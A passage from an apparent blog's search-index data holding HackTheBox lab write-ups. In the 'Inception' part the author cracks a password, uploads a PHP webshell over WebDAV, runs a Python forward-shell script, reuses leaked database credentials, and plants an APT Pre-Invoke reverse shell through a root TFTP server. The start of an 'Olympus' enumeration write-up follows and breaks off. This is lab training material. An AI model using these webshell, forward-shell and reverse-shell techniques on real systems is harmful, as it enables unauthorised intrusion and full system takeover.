(/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 6883 H/s (9.01ms) @ Accel:32 Loops:1000 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 22464/14344385 (0.16%) Rejected.........: 0/22464 (0.00%) Restore.Point....: 22400/14344385 (0.16%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000 Candidate.Engine.: Device Generator Candidates.#1....: boneka -\u0026gt; 171091 Hardware.Mon.#1..: Util: 99% Started: Sun Oct 22 17:20:47 2023 Stopped: Sun Oct 22 17:21:06 2023 We have WebDav We could try davtest └─$ davtest -url http://10.10.10.67/webdav_test_inception -auth webdav_tester:babygurl69 ******************************************************** Testing DAV connection OPEN SUCCEED: http://10.10.10.67/webdav_test_inception ******************************************************** NOTE Random string for this session: KYt_YHBtL4 ******************************************************** Creating directory MKCOL SUCCEED: Created http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4 ******************************************************** Sending test files PUT txt SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt PUT cfm SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm PUT asp SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp PUT jsp SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp PUT php SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php PUT cgi SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi PUT aspx SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx PUT jhtml SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml PUT shtml SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml PUT pl SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl PUT html SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html ******************************************************** Checking for test file execution EXEC txt SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt EXEC txt FAIL EXEC cfm FAIL EXEC asp FAIL EXEC jsp FAIL EXEC php SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php EXEC php FAIL EXEC cgi FAIL EXEC aspx FAIL EXEC jhtml FAIL EXEC shtml FAIL EXEC pl FAIL EXEC html SUCCEED: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html EXEC html FAIL ******************************************************** /usr/bin/davtest Summary: Created: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4 PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cfm PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.asp PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jsp PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.cgi PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.aspx PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.jhtml PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.shtml PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.pl PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.txt Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.php Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_KYt_YHBtL4/davtest_KYt_YHBtL4.html Let\u0026rsquo;s create a webshell └─$ curl -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php -d @shell.php \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;201 Created\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Created\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Resource /webdav_test_inception/shell.php has been created.\u0026lt;/p\u0026gt; \u0026lt;hr /\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Test it └─$ curl --data-urlencode \u0026#39;cmd=id\u0026#39; http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php uid=33(www-data) gid=33(www-data) groups=33(www-data) But if try to ping, I have nothing └─$ curl --data-urlencode \u0026#39;cmd=ping -c 1 10.10.16.9\u0026#39; http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/shell.php PING 10.10.16.9 (10.10.16.9) 56(84) bytes of data. --- 10.10.16.9 ping statistics --- 1 packets transmitted, 0 received, 100% packet loss, time 0ms It could be firewall We could create a forward shell based on this video This is the basic template import requests import random class forward_shell(object): def __init__(self, url, auth): self.url = url self.id = random.randrange(10000,99999) self.input = f\u0026#34;/dev/shm/stdin.{self.id}\u0026#34; self.output = f\u0026#34;/dev/shm/stdout.{self.id}\u0026#34; self.auth = auth print(f\u0026#34;[+] Starting forward shell with ID:{self.id}...\u0026#34;) # Create pipe self.execute_raw(f\u0026#34;mkfifo {self.input}\u0026#34;) self.execute_raw(f\u0026#34;tail -f {self.input} | /bin/sh 2\u0026gt;\u0026amp;1 \u0026gt; {self.output}\u0026#34;, timeout=0.5) print(f\u0026#34;[+] Forward shell with ID:{self.id} has beed initialized...\u0026#34;) def execute_raw(self, cmd, timeout=0.5): try: resp = requests.post(self.url, data={\u0026#34;cmd\u0026#34;: cmd}, auth=self.auth, timeout=timeout) except requests.exceptions.ReadTimeout: return None return resp.text\tdef execute(self, cmd): self.execute_raw(f\u0026#34;echo {cmd} \u0026gt; {self.input}\u0026#34;) resp = self.execute_raw(f\u0026#34;cat {self.output}; echo -n \u0026gt; {self.output}\u0026#34;) return resp def upgrade_shell(self): shell_upgrade = \u0026#34;\u0026#34;\u0026#34;python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; || python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; || script -qc /bin/bash /dev/null\u0026#34;\u0026#34;\u0026#34; stty = \u0026#34;stty raw -echo\u0026#34; print(self.execute(shell_upgrade)) print(self.execute(stty)) if __name__ == \u0026#34;__main__\u0026#34;: url = \u0026#34;http://10.10.10.67/webdav_test_inception/shell.php\u0026#34; auth = (\u0026#34;webdav_tester\u0026#34;, \u0026#34;babygurl69\u0026#34;) prompt = \u0026#34;$\u0026gt;\u0026#34; shell = forward_shell(url, auth) while True: cmd = input(prompt) if cmd == \u0026#34;upgrade\u0026#34;: prompt = \u0026#34;\u0026#34; shell.upgrade_shell() else: print(shell.execute(cmd)) Our shell works └─$ python3 forward_shell.py [+] Starting forward shell with ID:97412... [+] Forward shell with ID:97412 has beed initialized... $\u0026gt;ls shell.php webdav.passwd $\u0026gt; User During enumeration we see that we are probably inside container, since ip is different $\u0026gt;ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 4: eth0@if5: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe28:5363/64 scope link valid_lft forever preferred_lft forever Inside /var/www/html we see wordpress Let\u0026rsquo;s check the content $\u0026gt;ls -lha /var/www/html total 7.9M drwxr-xr-x 7 root root 4.0K Aug 10 2022 . drwxr-xr-x 3 root root 4.0K Aug 10 2022 .. -rw-r--r-- 1 root root 17K May 7 2017 LICENSE.txt -rw-r--r-- 1 root root 2.3K May 7 2017 README.txt drwxr-xr-x 6 root root 4.0K Aug 10 2022 assets drwxrwxr-x 4 root root 4.0K Aug 10 2022 dompdf drwxr-xr-x 2 root root 4.0K Aug 10 2022 images -rw-r--r-- 1 root root 2.9K Nov 6 2017 index.html -rw-r--r-- 1 root root 7.9M Oct 31 2017 latest.tar.gz drwxr-xr-x 2 www-data www-data 4.0K Oct 23 16:42 webdav_test_inception drwxr-xr-x 5 root root 4.0K Aug 10 2022 wordpress_4.8.3 We have creds inside wp-config.php $\u0026gt;cat /var/www/html/wordpress_4.8.3/wp-config.php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wordpress\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;root\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;VwPddNh7xMZyDQoByQL4\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); ... We see port 22 is open $\u0026gt;netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::3128 :::* LISTEN - udp 0 0 0.0.0.0:45347 0.0.0.0:* - udp6 0 0 :::36360 :::* - So let\u0026rsquo;s use squid to test the creds Using creds to login as coby via proxychains works └─$ proxychains sshpass -p \u0026#39;VwPddNh7xMZyDQoByQL4\u0026#39; ssh cobb@127.0.0.1 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Warning: Permanently added \u0026#39;127.0.0.1\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1 cobb@Inception:~$ Container Root sudo cobb@Inception:~$ sudo -l [sudo] password for cobb: Matching Defaults entries for cobb on Inception: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User cobb may run the following commands on Inception: (ALL : ALL) ALL cobb@Inception:~$ sudo su root@Inception:/home/cobb# Root Since we are inside container, let\u0026rsquo;s perform a ping sweep root@Inception:/home/cobb# for i in {1..254}; do (ping -c 1 192.168.0.$i | grep \u0026#34;bytes from\u0026#34; \u0026amp;); done 64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.068 ms 64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.039 ms We can enumerate ports using 2 methods root@Inception:/home/cobb# nc -zv 192.168.0.1 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused Connection to 192.168.0.1 21 port [tcp/ftp] succeeded! Connection to 192.168.0.1 22 port [tcp/ssh] succeeded! Connection to 192.168.0.1 53 port [tcp/domain] succeeded! root@Inception:/home/cobb# for i in {1..65535}; do (echo \u0026gt; /dev/tcp/192.168.0.1/$i) \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; echo \u0026#34;$i is open\u0026#34;; done 21 is open 22 is open 53 is open We have ftp, ssh and dns ports open Let\u0026rsquo;s start with ftp root@Inception:/home/cobb# ftp 192.168.0.1 Connected to 192.168.0.1. 220 (vsFTPd 3.0.3) Name (192.168.0.1:cobb): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Aug 10 2022 bin drwxr-xr-x 3 0 0 4096 Aug 10 2022 boot drwxr-xr-x 18 0 0 3780 Oct 23 16:18 dev drwxr-xr-x 93 0 0 4096 Aug 10 2022 etc drwxr-xr-x 3 0 0 4096 Aug 10 2022 home lrwxrwxrwx 1 0 0 33 Nov 30 2017 initrd.img -\u0026gt; boot/initrd.img-4.4.0-101-generic drwxr-xr-x 22 0 0 4096 Aug 10 2022 lib drwxr-xr-x 2 0 0 4096 Aug 10 2022 lib64 drwx------ 2 0 0 16384 Oct 30 2017 lost+found drwxr-xr-x 3 0 0 4096 Oct 30 2017 media drwxr-xr-x 2 0 0 4096 Aug 10 2022 mnt drwxr-xr-x 2 0 0 4096 Aug 01 2017 opt dr-xr-xr-x 221 0 0 0 Oct 23 16:18 proc drwx------ 6 0 0 4096 Aug 10 2022 root drwxr-xr-x 26 0 0 900 Oct 23 16:18 run drwxr-xr-x 2 0 0 12288 Nov 30 2017 sbin drwxr-xr-x 2 0 0 4096 Aug 10 2022 snap drwxr-xr-x 3 0 0 4096 Aug 10 2022 srv dr-xr-xr-x 13 0 0 0 Oct 23 17:04 sys drwxrwxrwt 10 0 0 4096 Oct 23 17:25 tmp drwxr-xr-x 10 0 0 4096 Aug 10 2022 usr drwxr-xr-x 13 0 0 4096 Aug 10 2022 var lrwxrwxrwx 1 0 0 30 Nov 30 2017 vmlinuz -\u0026gt; boot/vmlinuz-4.4.0-101-generic 226 Directory send OK. We can\u0026rsquo;t write So let\u0026rsquo;s continue enumeration We can ssh as cobb to host machine oot@Inception:/home/cobb# ssh cobb@192.168.0.1 The authenticity of host \u0026#39;192.168.0.1 (192.168.0.1)\u0026#39; can\u0026#39;t be established. ECDSA key fingerprint is SHA256:zj8NiAd9po8KKA/z7MGKjn7j6wPFpA2Y6bDTRecUrdE. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;192.168.0.1\u0026#39; (ECDSA) to the list of known hosts. cobb@192.168.0.1\u0026#39;s password: Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. cobb@Inception:~$ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:50:56:b9:04:67 brd ff:ff:ff:ff:ff:ff inet 10.10.10.67/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:467/64 scope global mngtmpaddr dynamic valid_lft 86396sec preferred_lft 14396sec inet6 fe80::250:56ff:feb9:467/64 scope link valid_lft forever preferred_lft forever 3: lxdbr0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff inet 192.168.0.1/24 scope global lxdbr0 valid_lft forever preferred_lft forever inet6 fe80::d864:a1ff:fe41:8ff/64 scope link valid_lft forever preferred_lft forever 5: vethD0K6BC@if4: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue master lxdbr0 state UP group default qlen 1000 link/ether fe:a2:b8:a9:45:e7 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet6 fe80::fca2:b8ff:fea9:45e7/64 scope link valid_lft forever preferred_lft forever We see a cronjob every 5 min is executed cobb@Inception:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) */5 * * * * root apt update 2\u0026gt;\u0026amp;1 \u0026gt;/var/log/apt/custom.log 30 23 * * * root apt upgrade -y 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null By the way we have a tftpd If we scanned udp, we would\u0026rsquo;ve noticed it nc -uzv 192.168.0.1 1-65535 2\u0026gt;\u0026amp;1 | grep -v refused cobb@Inception:~$ ls -lha /etc/init.d/ total 316K drwxr-xr-x 2 root root 4.0K Aug 10 2022 . ... -rwxr-xr-x 1 root root 597 Jan 19 2016 single -rw-r--r-- 1 root root 1.1K Jan 19 2016 skeleton -rwxr-xr-x 1 root root 4.0K Mar 16 2017 ssh -rwxr-xr-x 1 root root 2.1K Mar 24 2017 tftpd-hpa ... cobb@Inception:~$ netstat -tulpn (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 192.168.0.1:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::21 :::* LISTEN - tcp6 0 0 fe80::d864:a1ff:fe41:53 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - udp 0 0 0.0.0.0:2682 0.0.0.0:* - udp 0 0 192.168.0.1:53 0.0.0.0:* - udp 0 0 0.0.0.0:67 0.0.0.0:* - udp 0 0 0.0.0.0:69 0.0.0.0:* - udp6 0 0 fe80::d864:a1ff:fe41:53 :::* - udp6 0 0 :::69 :::* - Back to the cronjob We saw that apt update is executed every 5 minutes We can create a config file with Pre-Invoke containing reverse shell https://gtfobins.github.io/gtfobins/apt-get/ But we also need to place our config inside /etc/apt/apt.conf.d/ This is where tftpd will help us Since it is running as root Check /etc/default TFTP_USERNAME=\u0026#34;root\u0026#34; TFTP_DIRECTORY=\u0026#34;/\u0026#34; TFTP_ADDRESS=\u0026#34;:69\u0026#34; TFTP_OPTIONS=\u0026#34;--secure --create\u0026#34; Let\u0026rsquo;s create a config and place it via tftpd Create a file with APT::Update::Pre-Invoke {\u0026quot;bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.0.10/6666 0\u0026gt;\u0026amp;1'\u0026quot;} root@Inception:/home/cobb# tftp 192.168.0.1 tftp\u0026gt; put /home/cobb/rooted /etc/apt/apt.conf.d/rooted Sent 77 bytes in 0.0 seconds cobb@Inception:~$ ls -lha /etc/apt/apt.conf.d/ total 56K drwxr-xr-x 2 root root 4.0K Oct 23 17:43 . drwxr-xr-x 6 root root 4.0K Aug 10 2022 .. -rw-r--r-- 1 root root 49 Oct 30 2017 00aptitude -rw-r--r-- 1 root root 82 Oct 30 2017 00CDMountPoint -rw-r--r-- 1 root root 40 Oct 30 2017 00trustcdrom -rw-r--r-- 1 root root 769 Apr 14 2016 01autoremove -r--r--r-- 1 root root 2.9K Aug 10 2022 01autoremove-kernels -rw-r--r-- 1 root root 42 Apr 14 2016 01-vendor-ubuntu -rw-r--r-- 1 root root 129 May 24 2016 10periodic -rw-r--r-- 1 root root 108 May 24 2016 15update-stamp -rw-r--r-- 1 root root 85 May 24 2016 20archive -rw-r--r-- 1 root root 182 Nov 10 2015 70debconf -rw-r--r-- 1 root root 305 May 24 2016 99update-notifier -rw-rw-rw- 1 root root 76 Oct 23 17:43 rooted After few minutes, we receive our shell root@Inception:/home/cobb# nc -lvnp 6666 Listening on [0.0.0.0] (family 0, port 6666) Connection from [192.168.0.1] port 6666 [tcp/*] accepted (family 2, sport 33834) bash: cannot set terminal process group (13877): Inappropriate ioctl for device bash: no job control in this shell root@Inception:/tmp# ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/inception/images/inception.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/inception/","summary":"Inception Enumeration nmap └─$ nmap -Pn -p- 10.10.10.67 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:11 BST Stats: 0:05:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 81.05% done; ETC: 19:18 (0:01:20 remaining) Nmap scan report for 10.10.10.67 (10.10.10.67) Host is up (0.10s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 416.","tags":["HTB","dompdf","squid","proxychains","wfuzz","container","lxd","php-filter","webdav","davtest","webshell","forward-shell","wordpress","ping-sweep","tftp","apt","apt-pre-invoke"],"title":"[HTB] Machine: Inception"},{"categories":null,"contents":"Olympus Enumeration nmap └─$ nmap -Pn -p- 10.10.10.83 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 16:25 BST Nmap scan report for 10.10.10.83 (10.10.10.83) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp filtered ssh 53/tcp open domain 80/tcp open http 2222/tcp open EtherNetIP-1 Nmap done: 1 IP address (1 host up) scanned in 1194.65 seconds └─$ nmap -Pn -p22,53,80,2222 -sC -sV 10.10.10.83 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 16:48 BST Nmap scan report for 10.10.10.83 (10.10.10.83) Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp filtered ssh 53/tcp open domain (unknown banner: Bind) | dns-nsid: |_ bind.version: Bind | fingerprint-strings: | DNSVersionBindReqTCP: | version | bind |_ Bind 80/tcp open http Apache httpd |_http-title: Crete island - Olympus HTB |_http-server-header: Apache 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-City of olympia | ssh-hostkey: | 2048 f2:ba:db:06:95:00:ec:05:81:b0:93:60:32:fd:9e:00 (RSA) | 256 79:90:c0:3d:43:6c:8d:72:19:60:45:3c:f8:99:14:bb (ECDSA) |_ 256 f8:5b:2e:32:95:03:12:a3:3b:40:c5:11:27:ca:71:52 (ED25519) 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port53-TCP:V=7.94%I=7%D=10/19%Time=65314FF4%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,3F,\u0026#34;\\0=\\0\\x06\\x85\\0\\0\\x01\\0\\x01\\0\\x01\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\\xc0\\x0c\\0\\x10\\0\\x03\\0\\0\\0\\0\\0\\x05\\x04Bind\\xc0\\x0c SF:\\0\\x02\\0\\x03\\0\\0\\0\\0\\0\\x02\\xc0\\x0c\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.94%I=7%D=10/19%Time=65314FEF%P=x86_64-pc-linux-gnu%r(N SF:ULL,29,\u0026#34;SSH-2\\.0-City\\x20of\\x20olympia\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.14 seconds └─$ sudo nmap -Pn -p- -sU 10.10.10.83 --min-rate 5000 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 16:49 BST Warning: 10.10.10.83 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.83 (10.10.10.83) Host is up (0.14s latency). Not shown: 65383 open|filtered udp ports (no-response), 151 closed udp ports (port-unreach) PORT STATE SERVICE 53/udp open domain Nmap done: 1 IP address (1 host up) scanned in 146.81 seconds Web Server feroxbuster └─$ feroxbuster -u http://10.10.10.83 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.83 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 9l 24w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 200 GET 7l 11w 137c http://10.10.10.83/crete.css 200 GET 12l 26w 314c http://10.10.10.83/index.php 200 GET 68l 281w 185370c http://10.10.10.83/favicon.ico 200 GET 12l 26w 314c http://10.10.10.83/ dns └─$ dig axfr @10.10.10.83 olympus.htb ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr @10.10.10.83 olympus.htb ; (1 server found) ;; global options: +cmd ; Transfer failed. └─$ dig @10.10.10.83 olympus.htb ;; communications error to 10.10.10.83#53: timed out ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.19.17-1-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.10.10.83 olympus.htb ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: SERVFAIL, id: 56229 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;olympus.htb. IN A ;; Query time: 2567 msec ;; SERVER: 10.10.10.83#53(10.10.10.83) (UDP) ;; WHEN: Thu Oct 19 17:13:21 BST 2023 ;; MSG SIZE rcvd: 40 Foothold We have a strange HTTP header Xdebug Googling resutls in xdebug rce https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce Let\u0026rsquo;s test it User Root ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/olympus/images/olympus.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/olympus/","summary":"Olympus Enumeration nmap └─$ nmap -Pn -p- 10.10.10.83 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 16:25 BST Nmap scan report for 10.10.10.83 (10.10.10.83) Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp filtered ssh 53/tcp open domain 80/tcp open http 2222/tcp open EtherNetIP-1 Nmap done: 1 IP address (1 host up) scanned in 1194.65 seconds └─$ 